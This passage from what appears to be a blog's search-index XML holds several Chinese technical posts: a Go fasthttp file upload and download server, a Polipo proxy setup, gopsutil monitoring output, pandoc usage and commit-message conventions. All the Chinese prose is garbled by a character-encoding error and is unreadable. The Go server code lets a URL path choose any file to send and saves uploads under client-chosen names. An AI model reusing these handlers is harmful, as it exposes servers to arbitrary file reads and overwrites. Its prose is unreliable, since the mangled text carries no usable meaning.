*fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;// Index Handler, é»˜è®¤çš„ContenTypeæ˜¯text/plain, è¾“å‡ºçš„å†…å®¹åœ¨preæ ‡ç­¾é‡Œé¢// å› æ­¤è¿™é‡Œå¿…é¡»æ‰‹åŠ¨è®¾ç½®ContentTypeä¸ºtext/htmlfunc Index(ctx *fasthttp.RequestCtx) &#123; ctx.Response.Header.SetContentType("text/html") t := template.New("index.gtpl") t, _ = t.Parse(`&lt;html&gt; &lt;head&gt; &lt;title&gt;ä¸Šä¼ æ–‡ä»¶&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form enctype="multipart/form-data" action="/upload" method="post"&gt; &lt;input type="file" name="uploadfile" /&gt; &lt;input type="hidden" name="token" value="&#123;&#123;.&#125;&#125;"/&gt; &lt;input type="submit" value="upload" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;`) crutime := time.Now().Unix() h := md5.New() io.WriteString(h, strconv.FormatInt(crutime, 10)) token := fmt.Sprintf("%x", h.Sum(nil)) t.Execute(ctx, token)&#125;// UploadHandler is herefunc UploadHandler(ctx *fasthttp.RequestCtx) &#123; data, err := ctx.MultipartForm() if err != nil &#123; ctx.SetStatusCode(500) fmt.Println("get upload file error:", err) return &#125; fileObj := data.File["uploadfile"][0] err = fasthttp.SaveMultipartFile(fileObj, fileObj.Filename) if err != nil &#123; ctx.SetStatusCode(500) fmt.Println("save upload file error:", err) return &#125; ctx.Write([]byte("save file successfully!"))&#125;// DownloadHandler is herefunc DownloadHandler(ctx *fasthttp.RequestCtx) &#123; fileName := ctx.UserValue("filename") switch fileName := fileName.(type) &#123; case string: ctx.SendFile(fileName) default: ctx.SetStatusCode(500) fmt.Println("the filename is not string.") &#125;&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", Index) router.POST("/upload", UploadHandler) router.GET("/download/:filename", DownloadHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125;]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>fasthttp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åˆ©ç”¨Polipoæž„å»ºåŸºäºŽSSçš„http proxy]]></title>
    <url>%2F2017%2F01%2F24%2Fhttp-proxy%2F</url>
    <content type="text"><![CDATA[æžè¿™ä¸ªçš„ä¸»è¦åŽŸå› æ˜¯golangçš„å¾ˆå¤šä¾èµ–åŒ…éœ€è¦ç¿»å¢™ä¸‹è½½, è¿™ä¸åƒPythonå’ŒNodeJSæœ‰å®˜æ–¹æºä»“åº“çš„è¯­è¨€(é…ç½®å›½å†…æºå¯ä»¥åŠ é€Ÿ). ä¹‹å‰ç”¨windowsçš„æ—¶å€™ä¹Ÿæ˜¯ä½¿ç”¨ss, è€Œhttp proxyæ˜¯é€šè¿‡chromeçš„ä¸€ä¸ªæ’ä»¶Proxy SwitchyOmegaæ¥åšçš„ï¼Œä½†æ˜¯åœ¨macä¸‹é¢è¿™æ‹›ä¸çµäº†, ä¸‹é¢ä¸»è¦ä»‹ç»macå¦‚ä½•åˆ©ç”¨ssæ­å»ºhttp proxy. å®‰è£…Shadowsocksssçš„å®‰è£…å’Œè¿è¡Œæ˜¯å‰æ, è¿™é‡Œä¸å¤šåšä»‹ç»ï¼Œå…·ä½“è¯·æŸ¥çœ‹Shadowsockså®‰è£…å’Œä½¿ç”¨ Polipoç®€ä»‹è¿™é‡Œä¸»è¦ä½¿ç”¨Polipoæ¥åšhttp proxy, polipoçš„å®˜æ–¹æ˜¯è¿™æ ·ä»‹ç»å®ƒçš„ï¼šâ€œPolipo æ˜¯ä¸€ä¸ªå°è€Œå¿«é€Ÿçš„ç¼“å­˜ web ä»£ç†ç¨‹åº(web ç¼“å­˜, HTTP ä»£ç†, ä»£ç†æœåŠ¡å™¨)ã€‚å°½ç®¡ Polipo æ˜¯ä¸ºä¸€ä¸ªäººæˆ–ä¸€å°ç¾¤äººä½¿ç”¨è€Œè®¾è®¡çš„ï¼Œä½†å¹¶ä¸å¦¨ç¢å®ƒä¸ºä¸€å¤§ç¾¤äººæ‰€ä½¿ç”¨ã€‚â€,è¯¥é¡¹ç›®çš„åœ°å€ polipo Githubåœ°å€, è¯¥é¡¹ç›®çš„å®˜æ–¹æ–‡æ¡£polipoå®˜æ–¹æ–‡æ¡£å¯æƒœè¯¥é¡¹ç›®çš„ä½œè€…å·²ç»åœæ­¢è¯¥é¡¹ç›®çš„ç»´æŠ¤äº†, ä¸”ç”¨ä¸”çæƒœã€‚ Polipoå®‰è£…Shadowsockså®˜æ–¹æŽ¨èhttp proxyä»£ç†ä¹Ÿæ˜¯Polipo, å®˜æ–¹å¯¹æ­¤ä¹Ÿåšäº†ç®€å•çš„æè¿°ï¼Œæˆ‘ç›´æŽ¥æŠ„è¿‡æ¥äº† å®‰è£…123apt-get install poliposervice polipo stoppolipo socksParentProxy=localhost:1080 ä»¥ä¸Šæ˜¯å®˜æ–¹æ–‡æ¡£é‡Œé¢çš„è¯´æ˜Žï¼Œåœ¨macä¸‹ä½¿ç”¨polipoè¦ç¨åšä¿®æ”¹ macçš„å®‰è£…1brew install polipo Polipoä½¿ç”¨ sså¯¹polipoçš„ä½¿ç”¨æ ·ä¾‹ 1234567891011http_proxy=http://localhost:8123 apt-get updatehttp_proxy=http://localhost:8123 curl www.google.comhttp_proxy=http://localhost:8123 wget www.google.comgit config --global http.proxy 127.0.0.1:8123git clone https://github.com/xxx/xxx.gitgit xxxgit xxxgit config --global --unset-all http.proxy macçš„ä½¿ç”¨æ‰“å¼€ä¸€ä¸ªterminal, ä¸è¦å…³æŽ‰ï¼Œè±¡genymotionä¹‹ç±»çš„å…¶ä»–ç¨‹åºå°±å¯ä½¿ç”¨Httpä»£ç†äº†. 12âžœ ~ polipo socksParentProxy=localhost:1080Established listening socket on port 8123. ç„¶åŽæˆ‘ä»¬ä½¿ç”¨ä½¿ç”¨è¯¥http proxyæ¥å®‰è£…golangåŒ…,è®°å¾—å¼€å¯çš„ä½ çš„ss123456âžœ Blogs https_proxy=http://localhost:8123 go get -u -v github.com/valyala/fasthttpgithub.com/valyala/fasthttp (download)github.com/klauspost/compress (download)github.com/klauspost/cpuid (download)github.com/klauspost/crc32 (download)github.com/valyala/bytebufferpool (download)]]></content>
      <categories>
        <category>å¼€å‘å·¥å…·</category>
        <category>Shadowsocks</category>
      </categories>
      <tags>
        <tag>http-proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¤¸å¹³å°ç³»ç»Ÿç›‘æŽ§åº“-gopsutils]]></title>
    <url>%2F2017%2F01%2F22%2Fgopsutils%2F</url>
    <content type="text"><![CDATA[å¾ˆæ¬£èµtelegrafçš„æž¶æž„,ä¹‹å‰ä¹Ÿå¤šæ¬¡ä½¿ç”¨, æœ€è¿‘ä¹Ÿè¦é€šè¿‡ä»–æ¥èŽ·å–ç³»ç»Ÿè¿è¡Œæ—¶ä¿¡æ¯ç„¶åŽä¸Šä¼ ,æ‰€ä»¥æƒ³å€Ÿé‰´ä¸‹telegrafé‡Œé¢çš„systemæ¨¡å—çš„å®žçŽ°ï¼Œçœ‹äº†ä¸‹ä»–çš„æºç ï¼Œå‘çŽ°ä»–ä½¿ç”¨äº†ä¸€ä¸ªåå«gopsutilsåº“æ¥å®Œæˆæ‰€æœ‰çš„ç³»ç»Ÿæ•°æ®çš„é‡‡é›†çš„, äºŽæ˜¯å†³å®šæ‰‹åŠ¨è¯•è¯•è¿™ä¸ªåº“çš„åŠŸèƒ½ã€‚ ç®€ä»‹åœ¨è¯´gopsutilsä¹‹å‰æˆ‘ä»¬å¿…é¡»å…ˆè¯´ä¸‹psutilsæ˜¯å•¥, å› ä¸ºgopsutilså®žé™…ä¸Šå°±æ˜¯ä¸€ä¸ªgolangç‰ˆæœ¬çš„psutils(ä»Žåå­—ä¸Šä¹Ÿèƒ½çœ‹å‡ºæ¥)psutilsæ˜¯ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„pythonåº“, psutilsæ˜¯python process and system utilitiesçš„ä¸€ä¸ªç¼©å†™. å®ƒæœ‰å¦‚ä¸‹ç‰¹ç‚¹ è·¨å¹³å°: Linux, Windows, OSX, Sun Solaris, FreeBSD, OpenBSD and NetBSDçš„32ä½å’Œ64ä½ç³»ç»Ÿ åŠŸèƒ½ä¸°å¯Œ: å®žçŽ°äº†è¿›ç¨‹ç®¡ç†,ç³»ç»Ÿè¯Šæ–­, è¿™ä¸ªåº“åŸºæœ¬å®žçŽ°äº†è¿™äº›å‘½ä»¤è¡Œå·¥å…·çš„åŠŸèƒ½: ps, top, lsof, netstat, ifconfig, who, df, kill, free, nice, ionice, iostat, iotop, uptime, pidof, tty, taskset, pmap å¦‚æžœæƒ³è¦äº†è§£å…³äºŽgopsutilsæ›´å¤šçš„è¯¦æƒ… è¯·æŸ¥çœ‹gopsutils githubåœ°å€ å®‰è£…1âžœ gops_test go get -v &quot;github.com/shirou/gopsutil&quot; ä½¿ç”¨å…·ä½“çš„ä½¿ç”¨æ–‡æ¡£å¯ä»¥å‚è€ƒgopsutilçš„godocæ–‡æ¡£ä»¥ä¸‹ä»¥æµ‹è¯•æ”¶é›†cpu, disk, load, mem, net, process ä¸ºåˆ—, æ³¨æ„è¿™äº›å¯¹è±¡éƒ½ä½¿ç”¨Stringæ–¹æ³•, å› æ­¤å¯ä»¥ç›´æŽ¥è°ƒç”¨fmtæ‰“å°ï¼ŒStringæ–¹æ³•ä¼šå°†å…¶è½¬æ¢æˆJsonè¾“å‡º.12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package mainimport ( "fmt" "github.com/shirou/gopsutil/cpu" "github.com/shirou/gopsutil/disk" "github.com/shirou/gopsutil/load" "github.com/shirou/gopsutil/mem" "github.com/shirou/gopsutil/net" "github.com/shirou/gopsutil/process")func main() &#123; fmt.Println("CPUç»Ÿè®¡:") c, _ := cpu.Info() fmt.Println(c) fmt.Println("å†…å­˜ç»Ÿè®¡:") m, _ := mem.VirtualMemory() fmt.Println(m) fmt.Println("ç£ç›˜ç”¨é‡å’ŒIOç»Ÿè®¡:") dp, _ := disk.Partitions(true) du, _ := disk.Usage("/") di, _ := disk.IOCounters() fmt.Println(du) fmt.Println(dp) fmt.Println(di) fmt.Println("ç½‘ç»œIOç»Ÿè®¡:") ni, _ := net.IOCounters(true) fmt.Println(ni) fmt.Println("åè®®ç»Ÿè®¡:") nt, _ := net.ProtoCounters(nil) fmt.Println(nt) fmt.Println("é“¾æŽ¥çŠ¶æ€ç»Ÿè®¡:") nc, _ := net.Connections("all") fmt.Println(nc) fmt.Println("è¿›ç¨‹ç»Ÿè®¡:") pi, _ := process.Pids() fmt.Println(pi) p, _ := process.NewProcess(614) pm, _ := p.MemoryPercent() pn, _ := p.Username() fmt.Println(pm) fmt.Println(pn) fmt.Println("è´Ÿè½½ç»Ÿè®¡:") pl, _ := load.Avg() fmt.Println(pl)&#125; æœ€åŽæ‰§è¡Œè¿‡ä¼šçš„ç»“æžœå¤§æ¦‚ä¸ºè¿™æ ·:1234567891011121314151617181920CPUç»Ÿè®¡:[&#123;&quot;cpu&quot;:0,&quot;vendorId&quot;:&quot;GenuineIntel&quot;,&quot;family&quot;:&quot;6&quot;,&quot;model&quot;:&quot;69&quot;,&quot;stepping&quot;:1,&quot;physicalId&quot;:&quot;&quot;,&quot;coreId&quot;:&quot;&quot;,&quot;cores&quot;:2,&quot;modelName&quot;:&quot;Intel(R) Core(TM) i5-4278U CPU @ 2.60GHz&quot;,&quot;mhz&quot;:2600,&quot;cacheSize&quot;:256,&quot;flags&quot;:[&quot;fpu&quot;,&quot;vme&quot;,&quot;de&quot;,&quot;pse&quot;,&quot;tsc&quot;,&quot;msr&quot;,&quot;pae&quot;,&quot;mce&quot;,&quot;cx8&quot;,&quot;apic&quot;,&quot;sep&quot;,&quot;mtrr&quot;,&quot;pge&quot;,&quot;mca&quot;,&quot;cmov&quot;,&quot;pat&quot;,&quot;pse36&quot;,&quot;clfsh&quot;,&quot;ds&quot;,&quot;acpi&quot;,&quot;mmx&quot;,&quot;fxsr&quot;,&quot;sse&quot;,&quot;sse2&quot;,&quot;ss&quot;,&quot;htt&quot;,&quot;tm&quot;,&quot;pbe&quot;,&quot;sse3&quot;,&quot;pclmulqdq&quot;,&quot;dtes64&quot;,&quot;mon&quot;,&quot;dscpl&quot;,&quot;vmx&quot;,&quot;est&quot;,&quot;tm2&quot;,&quot;ssse3&quot;,&quot;fma&quot;,&quot;cx16&quot;,&quot;tpr&quot;,&quot;pdcm&quot;,&quot;sse4.1&quot;,&quot;sse4.2&quot;,&quot;x2apic&quot;,&quot;movbe&quot;,&quot;popcnt&quot;,&quot;aes&quot;,&quot;pcid&quot;,&quot;xsave&quot;,&quot;osxsave&quot;,&quot;seglim64&quot;,&quot;tsctmr&quot;,&quot;avx1.0&quot;,&quot;rdrand&quot;,&quot;f16c&quot;,&quot;smep&quot;,&quot;erms&quot;,&quot;rdwrfsgs&quot;,&quot;tsc_thread_offset&quot;,&quot;bmi1&quot;,&quot;avx2&quot;,&quot;bmi2&quot;,&quot;invpcid&quot;,&quot;fpu_csds&quot;,&quot;syscall&quot;,&quot;xd&quot;,&quot;1gbpage&quot;,&quot;em64t&quot;,&quot;lahf&quot;,&quot;lzcnt&quot;,&quot;rdtscp&quot;,&quot;tsci&quot;]&#125;]å†…å­˜ç»Ÿè®¡:&#123;&quot;total&quot;:8589934592,&quot;available&quot;:4315959296,&quot;used&quot;:4273975296,&quot;usedPercent&quot;:49.7556209564209,&quot;free&quot;:3390992384,&quot;active&quot;:2908176384,&quot;inactive&quot;:924966912,&quot;wired&quot;:1364955136,&quot;buffers&quot;:0,&quot;cached&quot;:0,&quot;writeback&quot;:0,&quot;dirty&quot;:0,&quot;writebacktmp&quot;:0,&quot;shared&quot;:0,&quot;slab&quot;:0,&quot;pagetables&quot;:0,&quot;swapcached&quot;:0&#125;ç£ç›˜ç”¨é‡å’ŒIOç»Ÿè®¡:&#123;&quot;path&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;total&quot;:249769230336,&quot;free&quot;:201003577344,&quot;used&quot;:48503508992,&quot;usedPercent&quot;:19.41932916506611,&quot;inodesTotal&quot;:60978814,&quot;inodesUsed&quot;:11905675,&quot;inodesFree&quot;:49073139,&quot;inodesUsedPercent&quot;:19.524281006842802&#125;[&#123;&quot;device&quot;:&quot;/dev/disk1&quot;,&quot;mountpoint&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;opts&quot;:&quot;rw,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;devfs&quot;,&quot;mountpoint&quot;:&quot;/dev&quot;,&quot;fstype&quot;:&quot;devfs&quot;,&quot;opts&quot;:&quot;rw,suiddir,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map -hosts&quot;,&quot;mountpoint&quot;:&quot;/net&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,nosuid,suiddir,nosymfollow,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map auto_home&quot;,&quot;mountpoint&quot;:&quot;/home&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,suiddir,nosymfollow,multilabel&quot;&#125;]map[]ç½‘ç»œIOç»Ÿè®¡:[&#123;&quot;name&quot;:&quot;lo0&quot;,&quot;bytesSent&quot;:22687,&quot;bytesRecv&quot;:22687,&quot;packetsSent&quot;:215,&quot;packetsRecv&quot;:215,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;gif0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;stf0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en0&quot;,&quot;bytesSent&quot;:6401764,&quot;bytesRecv&quot;:120874758,&quot;packetsSent&quot;:85192,&quot;packetsRecv&quot;:87266,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en1&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en2&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;p2p0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;awdl0&quot;,&quot;bytesSent&quot;:2331,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:2,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;bridg&quot;,&quot;bytesSent&quot;:342,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:1,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125;]åè®®ç»Ÿè®¡:[]é“¾æŽ¥çŠ¶æ€ç»Ÿè®¡:[&#123;&quot;fd&quot;:13,&quot;family&quot;:2,&quot;type&quot;:2,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;*&quot;,&quot;port&quot;:63824&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;&quot;,&quot;port&quot;:0&#125;,&quot;status&quot;:&quot;&quot;,&quot;uids&quot;:null,&quot;pid&quot;:238&#125; &#123;&quot;fd&quot;:64,&quot;family&quot;:2,&quot;type&quot;:1,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;192.168.3.7&quot;,&quot;port&quot;:49224&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;191.238.172.191&quot;,&quot;port&quot;:443&#125;,&quot;status&quot;:&quot;CLOSED&quot;,&quot;uids&quot;:null,&quot;pid&quot;:394&#125;]è¿›ç¨‹ç»Ÿè®¡:[1 45 46 48 49 53 54 55 62 64 65 69 70 71 73 74 76 77 79 80 81 82 83 85 88 89 93 95 96 97 98 100 101 102 105 110 118 130 133 135 136 142 143 147 149 159 168 169 170 171 172 173 174 175 179 182 183 184 185 187 188 189 190 192 195 196 197 198 200 218 219 220 226 227 229 231 232 233 237 238 239 242 243 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 265 266 267 268 269 270 271 272 273 274 276 277 278 279 280 281 282 283 284 285 286 287 289 290 291 292 294 295 296 297 299 300 302 305 307 308 311 312 314 316 317 324 325 329 339 340 342 343 344 345 346 348 360 361 362 366 367 368 371 377 386 391 392 393 394 397 423 426 427 428 429 430 433 437 443 445 446 451 452 454 455 456 461 463 469 470 474 475 477 481 483 486 487 488 511 514 554 555 624 650 711 722 723 724 725 726 727 729 736 737 741 742 743 791 866 867 878 880 883 889 516 517 518]0rootè´Ÿè½½ç»Ÿè®¡:&#123;&quot;load1&quot;:1.32,&quot;load5&quot;:1.35,&quot;load15&quot;:1.31&#125;]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>gopsutils</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨pandocå°†markdownæ–‡æ¡£è½¬æ¢æˆpdf]]></title>
    <url>%2F2017%2F01%2F19%2Fmarkdown-to-pdf%2F</url>
    <content type="text"><![CDATA[åœ¨å…¬å¸åšå†…éƒ¨åˆ†äº«çš„æ—¶å€™å¾€å¾€ç”¨ppt, å†™pptçš„è¿‡ç¨‹ä¸­å¾€å¾€è¿˜æœ‰æ¯”è¾ƒå¤šçš„ä»£ç ç¤ºä¾‹, é€šå¸¸çš„åšæ³•å°±æ˜¯ç›´æŽ¥æˆªå›¾, å…¶å®žè¿™å¯¹ä½¿ç”¨è€…æ¥è¯´æ˜¯å¾ˆä¸å‹å¥½çš„, è€Œæˆ‘ä¹‹å‰ä¸€ç›´ä½¿ç”¨markdownå†™åšå®¢, æ¯”å¦‚æˆ‘è¿™ä¸ªåšå®¢, å› æ­¤å°±æƒ³ä½¿ç”¨MarkDownæ¥å†™åˆ†äº«çš„æ–‡æ¡£, ä½†æ˜¯MarkDownçš„æ–‡æ¡£å¹¶ä¸æ–¹ä¾¿å†…éƒ¨ä¼ é˜…, å› æ­¤æƒ³åˆ°äº†ä¸€ä¸ªé—®é¢˜: èƒ½å¦ç”¨MarkDownå†™, ç„¶åŽè½¬æ¢æˆPDF, ç»™åŒäº‹ä½¿ç”¨ï¼ŸäºŽæ˜¯é—®äº†ä¸‹åº¦å¨˜, æžœç„¶æ‰¾åˆ°äº†ä¸€ä¸ªå·¥å…·: Pandoc, ä½¿ç”¨ä¸‹æ¥æ„Ÿè§‰ä¸é”™, åœ¨æ­¤åˆ†äº«ä¸€ä¸‹ä½¿ç”¨æ–¹æ³•, ä¹Ÿæ–¹ä¾¿ä»¥åŽè‡ªå·±æŸ¥é˜…ã€‚ ç®€ä»‹Pandocæ˜¯ä¸€ä¸ªç”¨haskellç¼–å†™çš„å¼€æºæ–‡æœ¬è½¬æ¢å·¥å…·ï¼Œå°å·§è¿…é€Ÿä¸”æ”¯æŒæ ¼å¼å¹¿æ³›ï¼Œå ªç§°æ–‡æœ¬è½¬æ¢åº”ç”¨çš„ç‘žå£«å†›åˆ€ã€‚æ”¯æŒå¾ˆå¤šç§è¾“å…¥è¾“å‡ºï¼Œæœ‰å…³Pandocå¯ä»¥åœ¨å…¶å®˜ç½‘è¿›è¡Œè¯¦ç»†äº†è§£ã€‚ä¸‹è½½é¡µé¢å¯ä»¥ç‚¹æ­¤è¿›å…¥ï¼Œåœ¨å…¶ä¸­é€‰æ‹©åˆé€‚çš„ç‰ˆæœ¬å³å¯ï¼ˆGitHubä¸‹è½½ä¸å¤šèµ˜è¿°), è‡³äºŽè¯¦ç»†çš„æè¿°è¯·çœ‹githubä¸Šçš„è¯´æ˜Žã€‚æˆ‘è¿™é‡Œä¸»è¦ä½¿ç”¨ markdownâ€”-&gt;pdfã€‚ å®‰è£…æˆ‘è¿™é‡Œä»…ä»‹ç»Macä¸‹çš„å®‰è£…, éœ€è¦å®‰è£…pandocå’ŒLaTeXå…¶ä»–å¹³å°å®˜æ–¹æœ‰è¯¦å°½çš„ä»‹ç», å…·ä½“è¯·æŸ¥çœ‹ï¼špandocå®˜æ–¹å®‰è£…æ–‡æ¡£ pandocå®‰è£…1$ brew install pandoc LaTeXå®‰è£…å› ä¸ºæˆ‘éœ€è¦è½¬æ¢æˆpdf,è¿˜éœ€è¦è£…LaTeX, é€‰ä¸€ä¸ªBasicç‰ˆæœ¬çš„å®‰è£…å³å¯, LaTeXçš„ä¸‹è½½åœ°å€ ä½¿ç”¨ç®€å•çš„ä½¿ç”¨å¯ä»¥1$ pandoc -h è¯¦ç»†ç”¨æ³•å¯ä»¥manæŸ¥çœ‹ï¼Œæˆ‘è¿™é‡Œç›´æŽ¥ç»™å¹²æ´»äº†,æˆ‘ä½¿ç”¨åºžæˆ¿,è¿™é‡Œè®°å¾—é€‰ä¸€ç§ä½ ç³»ç»Ÿä¸Šæœ‰çš„å­—ä½“ã€‚1pandoc -N -s --toc --latex-engine=xelatex -V CJKmainfont=&apos;PingFang SC&apos; -V mainfont=&apos;Monaco&apos; -V geometry:margin=1in Keystone_extension.markdown -o Keystone.pdf æ³¨æ„äº‹é¡¹ä¸»è¦æ˜¯Pandocé»˜è®¤æ˜¯å¯¹markDownè¯­æ³•æœ‰æ‰©å±•ï¼Œå¦‚æžœé‡åˆ°è½¬æ¢åŽçš„æ•ˆæžœå’Œé¢„æœŸæ•ˆæžœä¸ä¸€æ ·, è¿˜å¾—é˜…è¯»Pandocæ‰©å±•çš„MarkDownè¯­æ³•, è¿™ç¯‡åšå®¢å¯¹æ¬¡ä»‹ç»ä¸é”™Pandocä¸­çš„markdownè¯­æ³•æˆ‘è¿™é‡Œä»…åˆ—ä¸¾ä¸€ä¸ªæˆ‘é‡åˆ°çš„å‘ï¼Œå½“ç„¶å¦‚æžœä½ æƒ³ä½¿ç”¨æ ‡å‡†çš„MarkDownè¯­æ³•ï¼Œä¹Ÿå¯-f markdown_strictã€‚ å›¾ç‰‡ä½ç½®å¯¹åº”ä¸ä¸Šåœ¨markDownä¸­æ’å…¥çš„å›¾ç‰‡å’ŒMarkdowné‡Œçš„ä¸ä¸€æ ·, è¿™é‡Œéœ€è¦åœ¨å›¾ç‰‡åŽé¢æ·»åŠ ä¸€ä¸ª\, è¿™æ ·å›¾ç‰‡æ‰ä¸ä¼šæ¢è¡Œ, è¿™ä¸ªåœ¨å®ƒæ‰©å±•è¯­æ³•ä¸­æœ‰æè¿°ã€‚]]></content>
      <categories>
        <category>æ–‡æ¡£å·¥å…·</category>
        <category>pandoc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[commit messageç¼–å†™è§„èŒƒ]]></title>
    <url>%2F2017%2F01%2F17%2Fcommit-message-style%2F</url>
    <content type="text"><![CDATA[Gitæ¯æ¬¡æäº¤ä»£ç ï¼Œéƒ½è¦å†™Commit message(æäº¤è¯´æ˜Ž)ï¼Œå¦åˆ™å°±ä¸å…è®¸æäº¤, Commit messageå¾€å¾€ä¼šç”¨äºŽç”ŸæˆChange logæ–‡æ¡£, è§„èŒƒçš„Commit messageæ˜¯ä¸€ä¸ªé«˜è´¨é‡é¡¹ç›®åŸºæœ¬è¦æ±‚ã€‚ç¤¾åŒºæœ‰å¤šç§Commit messageçš„å†™æ³•è§„èŒƒã€‚å…¶ä¸­ä»¥å›½é™…çŸ¥åé¡¹ç›®AngularJSçš„è§„èŒƒä½¿ç”¨æœ€ä¸ºå¹¿æ³›, å› ä¸ºå…¶æ¯”è¾ƒåˆç†å’Œç³»ç»ŸåŒ–,å¹¶ä¸”æœ‰ç›¸åº”çš„é…å¥—å·¥å…·ã€‚ ä½œç”¨æ ¼å¼åŒ–å¾—Commit messageæœ‰å¾ˆå¤šå¥½å¤„ æä¾›æ›´å¤šçš„åŽ†å²ä¿¡æ¯ï¼Œæ–¹ä¾¿å¿«é€Ÿæµè§ˆ 1234567$ git log &lt;last tag&gt; HEAD --pretty=format:%sæ·»åŠ testcaseæ·»åŠ ignoreæ ¼å¼æ·»åŠ py2æ”¯æŒè¡¥å……entry_pointsæ·»åŠ æµ‹è¯•çŽ¯å¢ƒæ–‡ä»¶æ·»åŠ toxæµ‹è¯•ç›¸å…³æ–‡ä»¶ å¯ä»¥è¿‡æ»¤æŸäº›commitï¼ˆæ¯”å¦‚æ–‡æ¡£æ”¹åŠ¨ï¼‰ï¼Œä¾¿äºŽå¿«é€ŸæŸ¥æ‰¾ä¿¡æ¯ 123456789101112131415git log HEAD --grep 'æ·»åŠ 'commit dfedec2ca55bc57137e1ffe430f9f7216d912ca0Merge: 5fcae1d f5c5120Author: ç´«å·ç§€ &lt;719118794@qq.com&gt;Date: Mon Jan 9 19:13:47 2017 +0800 Merge pull request #1 from huang75961/master æ·»åŠ toxæµ‹è¯•commit f5c5120ac5bb43529bd2eb9e83ccef023450a8a5Author: hc &lt;409438984@qq.com&gt;Date: Mon Jan 9 19:00:32 2017 +0800 æ·»åŠ testcase å¯ä»¥ç›´æŽ¥ä»Žcommitç”ŸæˆChange log è¿™ä¸ªéœ€è¦é…åˆåŽé¢çš„å·¥å…·ä½¿ç”¨ è§„èŒƒæ¯æ¬¡æäº¤ï¼ŒCommit message éƒ½åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†ï¼šHeaderï¼ŒBody å’Œ Footerã€‚12345&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;&lt;body&gt;&lt;footer&gt; å…¶ä¸­ï¼ŒHeader æ˜¯å¿…éœ€çš„ï¼ŒBody å’Œ Footer 